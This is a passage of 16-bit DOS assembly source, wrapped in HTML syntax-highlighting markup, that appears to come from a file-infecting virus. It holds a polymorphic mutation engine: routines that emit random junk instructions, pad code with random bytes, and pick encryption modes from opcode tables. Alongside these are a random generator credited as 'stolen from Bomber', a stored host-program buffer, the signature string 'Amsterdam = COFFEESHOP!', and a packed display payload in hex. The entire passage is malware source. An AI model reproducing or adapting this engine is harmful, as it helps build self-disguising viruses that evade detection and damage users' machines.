</span><span class="sc5">junkA</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;DO rm,xxxx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">80C0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">no_sp</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">byte_word</span><span class="sc0">


</span><span class="sc5">junkB</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">nop8</span><span class="sc0">                    </span><span class="sc1">;NOP / LOOP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FDE2</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">junkC</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">09</span><span class="sc0">                   </span><span class="sc1">;CMPS* or SCAS*</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">mov_test</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A6</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">mov_test</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A0</span><span class="sc0">                  </span><span class="sc1">;MOV AX,[xxxx] or TEST AX,xxxx</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A8</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">byte_word</span><span class="sc0">


</span><span class="sc5">junkD</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">                   </span><span class="sc1">;XCHG AX,reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">no_sp</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">junkE</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">                   </span><span class="sc1">;PUSH reg / POP reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">junkF</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">                   </span><span class="sc1">;INC / DEC</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">no_sp</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              store a byte or a word</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">byte_word</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">only_byte</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">only_byte</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              don't fuck with SP!</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">no_sp</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_sp_ret</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc0">
</span><span class="sc5">no_sp_ret</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              don't fuck with SP!</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">no_sp2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">38</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_sp2_ret</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">no_sp2_ret</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              don't use [BP+..]</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">no_bp</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_bp2</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">no_bp2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_bp_ret</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">no_bp_ret</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              write byte for JMP/CALL and fill with random bullshit</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">fill_bullshit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">bull_lup</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">bull_lup</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              random number generator  (stolen from 'Bomber')</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">rnd_init</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_init0</span><span class="sc0">               </span><span class="sc1">;init</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000F</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">random_lup</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">                 </span><span class="sc1">;call random routine a few</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">random_lup</span><span class="sc0">              </span><span class="sc1">;  times to 'warm up'</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rnd_init0</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;initialize generator</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">move_rnd</span><span class="sc0">

</span><span class="sc5">rnd_get</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;calculate a random number</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;will be: mov ax,xxxx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;  and mov dx,xxxx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">rnd_lup</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">rcl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">rnd_l2</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">rnd_l2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">rnd_lup</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">move_rnd</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rnd_get</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rnd_get</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              tables for engine</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

                </span><span class="sc1">;       AX   AL   AH      (BX) BL   BH      CX   CL   CH</span><span class="sc0">
</span><span class="sc5">mov_byte</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B5</span><span class="sc0">

                </span><span class="sc1">;       nop clc  stc  cmc  cli  cld incbp decbp</span><span class="sc0">
</span><span class="sc5">nop_data8</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">45</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">4Dh</span><span class="sc0">

                </span><span class="sc1">;      or and xchg mov</span><span class="sc0">
</span><span class="sc5">nop_data16</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88</span><span class="sc0">

                </span><span class="sc1">;     bl/bh, bx, si  di</span><span class="sc0">
</span><span class="sc5">dir_change</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc0">
</span><span class="sc5">ind_change</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc0">


                </span><span class="sc1">;       xor xor add sub</span><span class="sc0">
</span><span class="sc5">how_mode</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">

                </span><span class="sc1">;       ?  add  xor  or</span><span class="sc0">
</span><span class="sc5">add_mode</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              text + buffer</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' Amsterdam = COFFEESHOP! '</span><span class="sc0">

</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">                </span><span class="sc1">;original code of dummy program</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">BUFLEN</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              the (packed) picture routine</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
                                                
</span><span class="sc5">beeld</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">015h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Bh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">036h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B7h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Fh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F2h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">
